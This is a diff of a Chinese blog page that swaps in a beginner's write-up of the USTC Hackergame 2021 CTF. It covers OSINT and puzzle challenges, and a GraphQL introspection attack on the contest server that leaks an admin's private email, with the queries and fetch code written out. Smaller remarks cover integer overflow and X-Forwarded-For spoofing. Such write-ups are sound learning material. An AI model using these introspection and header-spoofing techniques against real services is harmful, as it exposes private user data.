@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">Code Runner快速更改Python解释器路径 | 再聚樱花庄</title>
+  <title itemprop="name">中科大Hackergame 2021 | 再聚樱花庄</title>
   
     <link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/modules/favicon-32x32.jpg">
   
@@ -315,11 +315,11 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/background/article-cover/87002546_p0.jpeg);" src="https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/modules/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/background/article-cover/87002546_p0.jpeg">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/background/article-cover/79416681_p0.jpeg);" src="https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/modules/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/background/article-cover/79416681_p0.jpeg">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      Code Runner快速更改Python解释器路径</h1>
+      中科大Hackergame 2021</h1>
       <p class="entry-census">
         <span>
           <a href="https://mashiro.nl">
@@ -331,7 +331,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2021-8-2<span class="bull">
+        2021-11-6<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -346,18 +346,333 @@
         
         <div class="entry-content">
           <blockquote>
-<p>封面图：<a href="https://www.pixiv.net/artworks/87002546" target="_blank" rel="noopener">#魔女の旅々 - pixiv</a></p>
+<p>封面图：<a href="https://www.pixiv.net/artworks/79416681" target="_blank" rel="noopener">#制服 - pixiv</a></p>
 </blockquote>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>目前主要使用 VS Code + WSL2 进行开发，经常需要更换 Python 运行环境，但是 Code Runner 插件默认会使用 <code>python -u</code> 去执行文件，而无法和 Python 插件进行配合，所以要在配置文件中反复更改解释器路径。另外如果使用默认配置，在 WSL2 中会无法运行文件（Linux 要用 <code>python3 -u</code>，而 <code>python -u</code> 默认使用 python2 去运行），所以要把 Code Runner 运行配置更改成 <code>python3 -u</code>，并在 Windows 多配置一条 python3.exe 软链接，指向所需的解释器才能正常运行。（不建议直接将 python.exe 改名成 python3.exe，实测这样做 pip 会出问题）<br>显然这不是一个 Good idea，后来终于在 stackoverflow 找到了一个比较好的办法</p>
-<h2 id="安装-Python-插件"><a href="#安装-Python-插件" class="headerlink" title="安装 Python 插件"></a>安装 Python 插件</h2><p><del>不会吧，不会吧，不会有人用 VS Code 不装插件的吧</del></p>
-<h2 id="更改-Code-Runner-的设置"><a href="#更改-Code-Runner-的设置" class="headerlink" title="更改 Code Runner 的设置"></a>更改 Code Runner 的设置</h2><p>首先找到拓展，点击 Code Runner 的齿轮，选择拓展设置。<br>打开后右上角有一个 <strong>打开设置(json)</strong> 的按钮，点进去切换到 json 格式<br>然后定位到 <code>&quot;code-runner.executorMap&quot;</code>，修改成如下配置</p>
-<pre><code class="json">&quot;code-runner.executorMap&quot;: {
-        &quot;python&quot;: &quot;$pythonPath -u $fullFileName&quot;
-    },
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>又菜又爱玩的 Mashiro 最近又开了一个新坑，之前了解到中科大举办的CTF比赛，对新手来说比较友好，所以作为网安“带师”的我自然不会错过啦！ <del>（指当炮灰</del> 这次拉上了 <a href="https://lento-er.github.io/" target="_blank" rel="noopener">@Zyan</a> 一起来玩，虽然有违反比赛规则的嫌疑🙈  </p>
+<p>另外技术力有限，有纰漏的地方也欢迎大家指正啦 ~</p>
+<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><blockquote>
+<p>为了能让大家顺利签到，命题组把每一秒的 flag 都记录下来制成了日记本的一页。你只需要打开日记，翻到 Hackergame 2021 比赛进行期间的任何一页就能得到 flag！<br><img src="https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/image/2021-11/sign.webp" alt="sign-in"></p>
+</blockquote>
+<p>因为赛前看过去年的题解，所以一眼发现了 url 有问题，每点击一下 Next 按钮时间会多一秒，page 参数也会加一，那么想拿到 flag 的话调到比赛时间即可。</p>
+<p>随手找了个在线日期计算，就不敲代码实现了。<br>请求 url：<a href="http://202.38.93.111:10000/?page=1634961600" target="_blank" rel="noopener">http://202.38.93.111:10000/?page=1634961600</a></p>
+<p>BTW，看了别人的题解，发现开始时间的 1970-01-01 0:00:00 正好是 Unix 时间戳的起始时间，所以其实只用……</p>
+<pre><code class="shell">date +%s    // 计算 UTC 1970-01-01 0点到现在的秒数
 </code></pre>
-<p>$pythonPath 表示的是使用上面已经设置好的 pythonPath 的值，此值会随 python 插件更换解释器而更换<br>$fullFileName 则是引用当前 python 文件的路径</p>
-<p>最后将 <code>&quot;code-runner.runInTerminal&quot;</code> 所对应的值改为 <code>true</code>，就大功告成啦 ~</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] <a href="https://stackoverflow.com/questions/50689210/how-to-allow-vs-code-to-take-input-from-users" target="_blank" rel="noopener">How to allow VS Code to take input from users?</a></p>
+<p>总算是知道一分钟内拿下一血的大哥是怎么做的了 Orz</p>
+<h2 id="进制十六——参上"><a href="#进制十六——参上" class="headerlink" title="进制十六——参上"></a>进制十六——参上</h2><blockquote>
+<p>为严防 flag 泄漏以及其他存在于未来所有可能的意外灾难，神通广大的 Z 同学不仅强制要求每一道题目都加上权限和资源的限制，还给所有参与 Hackergame 2021 命题的计算机施加了一层法术结界。任何试图从结界逃逸的 flag 都会被无情抹除。</p>
+<p>而一位明面上是计算机学院的新生，实则为物理学院暗部核心成员的 X 同学，在 Hackergame 2021 命题组已经潜伏多时。妄想趁比赛开始的午时，借阳火正旺之势，冲破 Z 同学的结界，以图片而非明文的形式，将 flag 悄悄传递出来。</p>
+<p>好在 Z 同学法力之深厚，不可管窥蠡测。在 flag 被传出去的前两天，就已预知此事并将图片中的 flag 无声消泯了。</p>
+<p>只是，这位 X 同学，虽然不会退出 Vim，但是似乎对打开十六进制编辑器颇有造诣……</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/image/2021-11/hex_editor.png" alt="hex"><br>观察图片，发现黄色部分字母和数字是一一对应的关系，涂掉的部分就是 flag，题目也提示了十六进制相关，那先看看第一个字母 E 的 16 进制 ASCII 码是什么吧 ~ 发现正好是 45，问题解决。</p>
+<p>接下来就简单了，找个识图工具把数字提取出来，再进行转换就好啦。</p>
+<h2 id="去吧！追寻自由的电波"><a href="#去吧！追寻自由的电波" class="headerlink" title="去吧！追寻自由的电波"></a>去吧！追寻自由的电波</h2><blockquote>
+<p>为了打破 Z 同学布下的结界，X 同学偷偷搬出社团的业余无线电台试图向外界通讯。</p>
+<p>当然，如果只是这样还远远不够。遵依史称“老爹”的上古先贤的至理名言，必须要“用魔法打败魔法”。X 同学向上级申请到了科大西区同步辐射实验室设备的使用权限，以此打通次元空间，借助到另一个平行宇宙中 Z 同学的法力进行数据对冲，方才于乱中搏得一丝机会，将 flag 用无线电的形式发射了出去。</p>
+<p>考虑到信息的鲁棒性，X 同学使用了无线电中惯用的方法来区分字符串中读音相近的字母。即使如此，打破次元的强大能量扭曲了时空，使得最终接受到的录音的速度有所改变。</p>
+<p>为了保障同步辐射设备的持续运转，组织牺牲了大量的能源，甚至以东北部分地区无计划限电为代价，把这份沉甸甸的录音文件送到了你的手上。而刚刚起床没多久，试图抢签到题一血还失败了的你，可以不辜负同学们对你的殷切期望吗？</p>
+<p>注：flag 花括号内只包含小写字母。</p>
+</blockquote>
+<p><a href="https://github.com/USTC-Hackergame/hackergame2021-writeups/raw/master/official/%E5%8E%BB%E5%90%A7%EF%BC%81%E8%BF%BD%E5%AF%BB%E8%87%AA%E7%94%B1%E7%9A%84%E7%94%B5%E6%B3%A2/src/radio.mp3" target="_blank" rel="noopener">点击下载文件</a><br>拿到的是一个音频文件，打开一听，发现明显进行了加快。放进浏览器调 1/4 倍速，隐约听到 alpha，hotel……几个单词，然后题目提示了无线电，所以搜索了一下，发现了这个<br><a href="https://zh.wikipedia.org/wiki/%E5%8C%97%E7%BA%A6%E9%9F%B3%E6%A0%87%E5%AD%97%E6%AF%8D" target="_blank" rel="noopener">国际无线电通话拼写字母</a><br>那么接下来就是痛苦的英语听力环节（苦于不会修音，一开始才听出来几个单词，然后第五个词卡了好久，后来才发现是三个音节的，然而拼写表里面的单词最多也是两个音节的……所以那里是两个词，是 flag 后的 left-bracket，不是表里面的单词）</p>
+<p>原文：</p>
+<pre><code class="text">Foxtrot Lima Alpha Golf left-bracket Papa Hotel Oscar November Echo Tango India Charlie Alfa Bravo right-bracket
+</code></pre>
+<h2 id="猫咪问答-Pro-Max"><a href="#猫咪问答-Pro-Max" class="headerlink" title="猫咪问答 Pro Max"></a>猫咪问答 Pro Max</h2><p><strong>提示：解出谜题不需要是科大在校学生</strong></p>
+<ul>
+<li><p>第一题<br>「2017 年，中科大信息安全俱乐部（SEC@USTC）并入中科大 Linux 用户协会（USTCLUG）。目前，信息安全俱乐部的域名（sec.ustc.edu.cn）已经无法访问，但你能找到信息安全俱乐部的社团章程在哪一天的会员代表大会上通过的吗？」<br><br><br>看到那句已经无法访问，让我想起了阮老师的<a href="https://www.ruanyifeng.com/blog/2007/11/internet_archive.html" target="_blank" rel="noopener">一篇文章</a>里面提及的 <a href="https://archive.org/index.php" target="_blank" rel="noopener">Internet Archive</a>，猜测上面应该有存档，果不其然找到了这个<br><a href="https://web.archive.org/web/20170613090934/http://sec.ustc.edu.cn/doku.php/codes" target="_blank" rel="noopener">https://web.archive.org/web/20170613090934/http://sec.ustc.edu.cn/doku.php/codes</a></p>
+</li>
+<li><p>第二题<br>「中国科学技术大学 Linux 用户协会在近五年多少次被评为校五星级社团？」<br><br><br>在科大 LUG 的介绍页面就能找到<br><a href="https://lug.ustc.edu.cn/wiki/intro/" target="_blank" rel="noopener">https://lug.ustc.edu.cn/wiki/intro/</a></p>
+</li>
+</ul>
+<blockquote>
+<p>为了表彰其出色表现，协会于 2011 年 5 月被评为中国科学技术大学优秀学生社团，于 2012 年 5 月、2013 年 5 月及 2014 年 5 月分别被评为中国科学技术大学四星级学生社团，并于 2015 年 5 月、2017 年 7 月、2018 年 9 月、2019 年 8 月、2020 年 9 月及 2021 年 9 月被评为中国科学技术大学五星级学生社团。</p>
+</blockquote>
+<p>其实这里算歪打正着了，因为问的是近五年，所以 15 年是不算的，不过我们可以找到 21 年 LUG 还是五星社团（官方题解提示）<br><a href="https://zsb.ustc.edu.cn/_upload/article/images/aa/64/6fa4dabb4810a17cf7c1d978c481/bfc8bd9e-51a8-4b61-9c42-8d484a7d72c0.jpg" target="_blank" rel="noopener">https://zsb.ustc.edu.cn/_upload/article/images/aa/64/6fa4dabb4810a17cf7c1d978c481/bfc8bd9e-51a8-4b61-9c42-8d484a7d72c0.jpg</a></p>
+<ul>
+<li><p>第三题<br>「中国科学技术大学 Linux 用户协会位于西区图书馆的活动室门口的牌子上“LUG @ USTC”下方的小字是？」<br><br><br>老实说我第一反应是找街景地图，但是发现只能看到图书馆门口，仅此而已。而且题目说的是图书馆的活动室，所以应该是在里面的。用街景地图的思路看来行不通，那就只能搜 LUG 关于图书馆的新闻，万幸找到了<br><a href="https://lug.ustc.edu.cn/news/2016/06/new-activity-room-in-west-library/" target="_blank" rel="noopener">https://lug.ustc.edu.cn/news/2016/06/new-activity-room-in-west-library/</a><br>小插曲：当时 Zyan 想到的居然是去 Shodan 找中科大图书馆有没有被入侵的摄像头，真的被他的脑洞惊到了，觉得他很有当 hacker 的潜质。</p>
+</li>
+<li><p>第四题<br>「在 SIGBOVIK 2021 的一篇关于二进制 Newcomb-Benford 定律的论文中，作者一共展示了多少个数据集对其理论结果进行验证？」<br><br><br>这题直接给工具人 Zyan 去看，因为文章很长<br><a href="http://sigbovik.org/2021/proceedings.pdf" target="_blank" rel="noopener">http://sigbovik.org/2021/proceedings.pdf</a><br>事实证明他做阅读理解还是有一手的，很快就把答案找出来了（他看完才发现可以看图来数，tcl）</p>
+</li>
+<li><p>第五题<br>「不严格遵循协议规范的操作着实令人生厌，好在 IETF 于 2021 年成立了 Protocol Police 以监督并惩戒所有违背 RFC 文档的行为个体。假如你发现了某位同学可能违反了协议规范，根据 Protocol Police 相关文档中规定的举报方法，你应该将你的举报信发往何处？」（答案含九个字符）<br><br><br>Google 搜索 protocol police 和 RFC，很容易找到 <a href="https://datatracker.ietf.org/doc/html/rfc8962" target="_blank" rel="noopener">rfc8962</a></p>
+</li>
+</ul>
+<blockquote>
+<ol start="6">
+<li>Reporting Offenses<br>Send all your reports of possible violations and all tips about<br>wrongdoing to /dev/null.  The Protocol Police are listening and will<br>take care of it.</li>
+</ol>
+</blockquote>
+<p>其实里面有个 Unix 行话，/dev/null 即比特桶或者黑洞。因为其在类 Unix 系统中是一个特殊的设备文件，它丢弃一切写入其中的数据。</p>
+<h2 id="旅行照片"><a href="#旅行照片" class="headerlink" title="旅行照片"></a>旅行照片</h2><blockquote>
+<p>你的学长决定来一场说走就走的旅行。通过他发给你的照片来看，他应该是在酒店住下了。<br><img src="https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/image/2021-11/travel-photo.jpg" alt="travel"><br>从照片来看，酒店似乎在小区的一栋高楼里，附近还有一家 KFC 分店。突然，你意识到照片里透露出来的信息比表面上看起来的要多。<br>请观察照片并答对全部 5 道题以获取 flag。注意：图片未在其他地方公开发布过，也未采取任何隐写措施（通过手机拍摄屏幕亦可答题）。</p>
+</blockquote>
+<ul>
+<li><p>第一题<br>「该照片拍摄者的面朝方向为？」</p>
+</li>
+<li><p>第二题<br>「该照片的拍摄时间大致为？」</p>
+</li>
+<li><p>第三题<br>「该照片的拍摄者所在楼层为？」</p>
+</li>
+<li><p>第四题<br>「该照片左上角 KFC 分店的电话号码是？」</p>
+</li>
+<li><p>第五题<br>「该照片左上角 KFC 分店左侧建筑有三个水平排列的汉字，它们是？」</p>
+</li>
+</ul>
+<p>平时在 b 站看多了别人分析图片信息，没想到今天自己也要亲历一次头脑风暴，真是太棒了(x<br>一开始是拿去 Google 和百度识图了，结果什么都没找到，毕竟题目说了图片未曾在其他地方公开。看图片感觉地点靠近港口，而且从公交车在街道上的朝向分析，估计是在国内的某个海滨。左上角隐约看见有家 KFC，然后没发现更多有用的信息了。找了 Zyan 一起分析，他说可以从开封菜下手，毕竟蓝色的 KFC 挺少见的。搜索蓝色 KFC，好家伙，原来那是一家网红店<br><a href="https://www.xiaohongshu.com/discovery/item/5e985cda00000000010076e5" target="_blank" rel="noopener">https://www.xiaohongshu.com/discovery/item/5e985cda00000000010076e5</a><br>校验一下是不是吧，帖主给的地点是秦皇岛新澳海底世界，打开百度地图看看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/image/2021-11/map.jpg" alt="map"></p>
+<p>评论里给的图片契合度挺高的，而且观察地图的海岸线，和题目图片的基本吻合，所以基本可以确定就是这个地方。题目还说了，酒店在小区的一栋高楼里，所以拍摄者的位置大概在 KFC 西北面的小区群里。接下来打开街景地图，发现 KFC 那条路没有街景，绝了！！！<br>幸好 Zyan 在大众点评找到了这个（Zyan，我滴超人！大众点评，yyds！）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/image/2021-11/Dolphinarium.jpg" alt="Dolphinarium"></p>
+<p>观察题目图片最右侧的那栋建筑，我们可以数到十六层，用手机大概模拟了一下，发现那种角度拍摄到的楼层不会超过拍摄者所在楼层的三层以上，估计是 13-15 其中一层，所以暴力穷举即可。</p>
+<p>最后剩下拍摄时间的问题，通过建筑的阴影可以注意到太阳几乎从正西侧照射而来，故为傍晚。但当时判断方位不准确，所以我直接人肉遍历了一次时间😂</p>
+<h2 id="图之上的信息"><a href="#图之上的信息" class="headerlink" title="图之上的信息"></a>图之上的信息</h2><blockquote>
+<p>小 T 听说 GraphQL 是一种特别的 API 设计模式，也是 RESTful API 的有力竞争者，所以他写了个小网站来实验这项技术。</p>
+<p>你能通过这个全新的接口，获取到没有公开出来的管理员的邮箱地址吗？</p>
+</blockquote>
+<p>这题就有 CTF 那味了，因为目前做到的题甚至都不用脚本去暴力穷举，更像是一种解密，多数都可以靠一些基本的社工学技巧去破解。搜索了一下 GraphQL 是个什么东西，发现是一种 API 查询语言？相当于在后端和数据库之间再套了一层（个人理解）。看了一下官方文档，发现概念挺抽象的。没办法，先打开题目看看吧 ~</p>
+<p>给了一个登录界面，然后提供了 Guest 用户名和密码 Guest，登陆进去如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/image/2021-11/gql-1.webp" alt="panel"></p>
+<p>提示了 flag 是 admin 的邮箱。先 F12 打开控制台，查找 graphql，然后发现页面向 <a href="http://202.38.93.111:15001/graphql" target="_blank" rel="noopener">http://202.38.93.111:15001/graphql</a> 发送了一次 POST 请求，十分可疑。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/image/2021-11/gql-2.webp" alt="post"></p>
+<p>点击查看详情，发现请求参数如下</p>
+<pre><code class="request">{ 
+  notes(userId: 2)
+  { 
+    id
+    contents }
+}
+</code></pre>
+<p>那么根据经验，admin 的 id 应该是 1，先改成 1 重发一次请求，看看有什么结果</p>
+<pre><code class="JavaScript">fetch(&quot;http://202.38.93.111:15001/graphql&quot;, {
+  &quot;headers&quot;: {
+    &quot;accept&quot;: &quot;application/json, text/plain, */*&quot;,
+    &quot;accept-language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;,
+    &quot;content-type&quot;: &quot;application/json&quot;,
+    &quot;proxy-connection&quot;: &quot;keep-alive&quot;
+  },
+  &quot;referrer&quot;: &quot;http://202.38.93.111:15001/notes&quot;,
+  &quot;referrerPolicy&quot;: &quot;strict-origin-when-cross-origin&quot;,
+  &quot;body&quot;: &quot;{\&quot;query\&quot;:\&quot;{ notes(userId: 1) { id\\ncontents }}\&quot;}&quot;,
+  &quot;method&quot;: &quot;POST&quot;,
+  &quot;mode&quot;: &quot;cors&quot;,
+  &quot;credentials&quot;: &quot;include&quot;
+});
+</code></pre>
+<p>响应如下：</p>
+<pre><code class="json">{
+    &quot;errors&quot;: [
+        {
+            &quot;message&quot;: &quot;This user has no permission to access this.&quot;,
+            &quot;locations&quot;: [
+                {
+                    &quot;line&quot;: 1,
+                    &quot;column&quot;: 3
+                }
+            ],
+            &quot;path&quot;: [
+                &quot;notes&quot;
+            ]
+        }
+    ],
+    &quot;data&quot;: {
+        &quot;notes&quot;: null
+    }
+}
+</code></pre>
+<p>看来事情没有这么简单，但是又不太懂 graphql，那怎么查询呢？想了一下，别的 CTF 比赛应该也有相似类型的题目，用 graphql + ctf 两个关键词去搜索，果然找到了些许思路。</p>
+<ul>
+<li><a href="https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/" target="_blank" rel="noopener">https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/</a></li>
+<li><a href="https://hwlanxiaojun.github.io/2020/04/14/当CTF遇上GraphQL的那些事/" target="_blank" rel="noopener">https://hwlanxiaojun.github.io/2020/04/14/当CTF遇上GraphQL的那些事/</a></li>
+<li><a href="https://www.jianshu.com/p/e59a27a15b5a" target="_blank" rel="noopener">https://www.jianshu.com/p/e59a27a15b5a</a> 的 GraphQL-WEB 部分</li>
+</ul>
+<p>总的来说，是由于 GraphQL 存在内省机制，如果不加以处理，则可能会泄露系统中所有的可用的查询，以及查询支持的字段等信息。</p>
+<p>这题估计也是要利用类似的漏洞，我们先通过<code>__schema</code>查询所有可用对象试试</p>
+<pre><code class="request">{
+    __schema {
+        types {
+            name
+        }
+    }
+}
+</code></pre>
+<p>结果如下</p>
+<pre><code class="json">{
+    &quot;data&quot;: {
+        &quot;__schema&quot;: {
+            &quot;types&quot;: [
+                {
+                    &quot;name&quot;: &quot;Query&quot;
+                },
+                {
+                    &quot;name&quot;: &quot;GNote&quot;
+                },
+                {
+                    &quot;name&quot;: &quot;Int&quot;
+                },
+                {
+                    &quot;name&quot;: &quot;String&quot;
+                },
+                {
+                    &quot;name&quot;: &quot;GUser&quot;
+                },
+                {
+                    &quot;name&quot;: &quot;Boolean&quot;
+                },
+                {
+                    &quot;name&quot;: &quot;__Schema&quot;
+                },
+                {
+                    &quot;name&quot;: &quot;__Type&quot;
+                },
+                {
+                    &quot;name&quot;: &quot;__TypeKind&quot;
+                },
+                {
+                    &quot;name&quot;: &quot;__Field&quot;
+                },
+                {
+                    &quot;name&quot;: &quot;__InputValue&quot;
+                },
+                {
+                    &quot;name&quot;: &quot;__EnumValue&quot;
+                },
+                {
+                    &quot;name&quot;: &quot;__Directive&quot;
+                },
+                {
+                    &quot;name&quot;: &quot;__DirectiveLocation&quot;
+                }
+            ]
+        }
+    }
+}
+</code></pre>
+<p>其中比较敏感的是<code>GUser</code>这个对象，用<code>__type</code>查询<code>GUser</code>的所有字段：</p>
+<pre><code class="request">{
+  __type(name: &quot;GUser&quot;) {
+    name
+    fields {
+      name
+      type {
+        name
+        kind
+      }
+    }
+  }
+}
+</code></pre>
+<p>结果如下：</p>
+<pre><code class="json">{
+    &quot;data&quot;: {
+        &quot;__type&quot;: {
+            &quot;name&quot;: &quot;GUser&quot;,
+            &quot;fields&quot;: [
+                {
+                    &quot;name&quot;: &quot;id&quot;,
+                    &quot;type&quot;: {
+                        &quot;name&quot;: &quot;Int&quot;,
+                        &quot;kind&quot;: &quot;SCALAR&quot;
+                    }
+                },
+                {
+                    &quot;name&quot;: &quot;username&quot;,
+                    &quot;type&quot;: {
+                        &quot;name&quot;: &quot;String&quot;,
+                        &quot;kind&quot;: &quot;SCALAR&quot;
+                    }
+                },
+                {
+                    &quot;name&quot;: &quot;privateEmail&quot;,
+                    &quot;type&quot;: {
+                        &quot;name&quot;: &quot;String&quot;,
+                        &quot;kind&quot;: &quot;SCALAR&quot;
+                    }
+                }
+            ]
+        }
+    }
+}
+</code></pre>
+<p>Great！里面有个<code>privateEmail</code>，flag 应该就在里面。然后看一下<code>Query</code>里面定义的可用查询</p>
+<pre><code class="request">{
+  __schema {
+    queryType {
+      fields {
+        name
+        description
+      }
+    }
+  }
+}
+</code></pre>
+<p>结果：</p>
+<pre><code class="json">{
+    &quot;data&quot;: {
+        &quot;__schema&quot;: {
+            &quot;queryType&quot;: {
+                &quot;fields&quot;: [
+                    {
+                        &quot;name&quot;: &quot;note&quot;,
+                        &quot;description&quot;: &quot;Get a specific note information&quot;
+                    },
+                    {
+                        &quot;name&quot;: &quot;notes&quot;,
+                        &quot;description&quot;: &quot;Get notes information of a user&quot;
+                    },
+                    {
+                        &quot;name&quot;: &quot;user&quot;,
+                        &quot;description&quot;: &quot;Get a specific user information&quot;
+                    }
+                ]
+            }
+        }
+    }
+}
+</code></pre>
+<p>那么最后猜测 admin 的 id 是 1，构造请求：</p>
+<pre><code class="request">{
+    user(id:1) { 
+        privateEmail 
+    } 
+}
+</code></pre>
+<p>返回结果：</p>
+<pre><code class="json">{
+    &quot;data&quot;: {
+        &quot;user&quot;: {
+            &quot;privateEmail&quot;: &quot;flag{dont_let_graphql_l3ak_data_7e63d49f66@hackergame.ustc}&quot;
+        }
+    }
+}
+</code></pre>
+<p>GET FLAG!!!</p>
+<h2 id="有思路但没解出的题"><a href="#有思路但没解出的题" class="headerlink" title="有思路但没解出的题"></a>有思路但没解出的题</h2><ul>
+<li>卖瓜</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/image/2021-11/HQ.webp" alt="HQ"></p>
+<p>咋一看觉得是不可能的，因为 6 和 9 都是三的倍数，不用浮点数怎么也凑不到 20。试了一下，发现可以传入负数，但好像没什么用。一开始想着用 burpsuite 抓包修改数据，但是服务器没返回 flag。然后看了一下 19 年的题解，感觉这题大概率也是通过 INT64 溢出实现的，但还是没拿到 flag。<del>（才不是不会构造呢！我有一个绝妙的方法，只是这里空间太小，写不下了）</del></p>
+<ul>
+<li>FLAG 助力大红包</li>
+</ul>
+<blockquote>
+<p>“听说没？【大砍刀】平台又双叒做活动啦！参与活动就送 0.5 个 flag 呢，攒满 1 个 flag 即可免费提取！”</p>
+<p>“还有这么好的事情？我也要参加！”</p>
+<p>“快点吧！我已经拿到 flag 了呢！再不参加 flag 就要发完了呢。”</p>
+<p>“那怎么才能参加呢？”</p>
+<p>“这还不简单！点击下面的链接就行”</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/image/2021-11/大砍刀.webp" alt="大砍刀"></p>
+<p>感觉是要用到代理池等工具去做才行，然而官方题解是……</p>
+<blockquote>
+<p>应当可以很容易发现，用户通过点击助力按钮，即可积攒 Flag 。但是题目写出会对源地址进行检查， 位于同一个 /8 网络内的用户只能助力一次。（一个 /8 网段内的所有 IP 地址的第一个字节是相同的。很容易可以知道， IPv4 中至多只有 256 个 /8 网段。</p>
+<p>其实，如果对 Flag 数量进行多项式拟合，可以发现 flag 数量为一精确的二次函数：</p>
+<pre><code>flag = (-0.0000076*(count-256)^2+1)
+</code></pre><p>最终需要攒齐全部 256 个 /8 网段的助力才可获得全部 Flag。</p>
+<p>即便没有上面这一步，应当可以很快意识（也许很难）到使用好友助力或使用代理池是不可行的，这是由于不是全部 IPv4 /8 地址块是可用的。这包括：</p>
+<p>RFC1700 定义的 0.0.0.0/8 和回环地址 127.0.0.0/8。<br>RFC1918 定义的私有地址 10.0.0.0/8、192.168.0.0/16 ，172.16.0.0/12<br>RFC3171 定义的组播地址 224.0.0.0/4<br>RFC1700 定义的保留地址 240.0.0.0/4<br>用于特殊网络的 14.0.0.0/8 , 24.0.0.0/8 以及 39.0.0.0/8<br>美国国防部宣告的大量 IPv4 /8 网段，例如 6.0.0.0/8 ， 7.0.0.0/8 等等 十几个 /8 网段<br>详细信息可用参考 <a href="https://datatracker.ietf.org/doc/html/rfc3330" target="_blank" rel="noopener">RFC3330</a>.</p>
+</blockquote>
+<p>所以要用 <code>X-Forwarded-For</code> 去欺骗服务器（555，自己太菜了</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>做了六道题，比预期好很多，毕竟第一次打 CTF，所以菜也是情有可原的（bushi<br>最终成绩是 general：450，web：250，math：0，binary：0，total：700<br>数学和逆向一道都没写出来，流下了不学无术的泪水😭。</p>
+<p>不过玩得挺开心的，也锻炼了自己快速学习的能力（虽然 GraphQL 还是一知半解），希望下一年密码学和逆向不要再 0 蛋吧 QAQ ~</p>
 
         </div>
         <!-- .entry-content -->
@@ -386,36 +701,19 @@
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2021/11/06/技术/中科大Hackergame-2021/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/modules/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/background/article-cover/79416681_p0.jpeg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/background/article-cover/79416681_p0.jpeg">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                中科大Hackergame 2021</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2021/01/16/生活/迁移&杂谈/" rel="next">
+            <a href="/2021/08/02/技术/Code-Runner快速更改Python解释器路径/" rel="next">
               <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/modules/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/background/article-cover/82862103_p13.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/background/article-cover/82862103_p13.webp">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/modules/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/background/article-cover/87002546_p0.jpeg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/background/article-cover/87002546_p0.jpeg">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                迁移&amp;杂谈</h3>
+                Code Runner快速更改Python解释器路径</h3>
                 <hr>
               </div>
             </a>
